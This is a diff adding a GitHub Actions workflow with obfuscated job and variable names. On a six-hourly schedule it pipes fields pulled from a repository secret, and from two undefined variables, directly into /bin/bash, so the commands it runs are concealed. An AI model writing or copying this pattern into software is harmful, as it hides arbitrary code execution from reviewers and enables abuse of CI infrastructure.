@@ -1,0 +1,20 @@
+name: qianlisong2b
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qianlisong2b
+        env:
+          slvh033: ${{ secrets.slvh033 }}
+        run: |
+          echo $slvh033 | jq -r .dxopf42 | /bin/bash
+          echo $jqqh176 | jq -r .yj0581 | /bin/bash
+          echo $vjsya1253 | jq -r .p98 | /bin/bash
+
